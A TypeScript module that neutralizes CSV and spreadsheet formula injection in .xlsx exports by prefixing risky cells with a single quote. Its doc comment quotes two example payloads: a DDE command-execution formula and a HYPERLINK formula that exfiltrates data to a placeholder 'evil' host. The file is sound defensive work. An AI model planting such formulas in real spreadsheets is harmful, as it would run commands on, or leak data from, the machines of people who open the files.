/**
 * CSV / spreadsheet formula-injection neutralization (OWASP "CSV Injection" /
 * CWE-1236). A cell whose text begins with = + - @ TAB or CR is interpreted as
 * a formula by Excel / LibreOffice / Google Sheets when the exported file is
 * opened. Since operator-supplied strings (AHU names, remarks, performer names)
 * flow verbatim into our .xlsx exports and those files are opened on
 * reviewers'/auditors' workstations, an attacker-controlled cell like
 * `=cmd|'/c calc'!A1` or `=HYPERLINK("http://evil/"&<exfil>)` would execute.
 *
 * Neutralize by prefixing a single quote (the standard, Excel-recognized escape
 * that renders the cell as literal text). Non-string values pass through
 * unchanged so numbers/dates keep their type.
 */
const FORMULA_TRIGGER = /^[=+\-@\t\r]/;

export function neutralizeFormula<T>(value: T): T | string {
  if (typeof value !== 'string' || value.length === 0) return value;
  return FORMULA_TRIGGER.test(value) ? `'${value}` : value;
}

/**
 * Map an object's string values through {@link neutralizeFormula}, leaving
 * non-strings intact. Use when building an ExcelJS `addRow({...})` payload from
 * data that contains any user-supplied text.
 */
export function neutralizeRow<T extends Record<string, unknown>>(row: T): T {
  const out: Record<string, unknown> = {};
  for (const [k, v] of Object.entries(row)) out[k] = neutralizeFormula(v);
  return out as T;
}
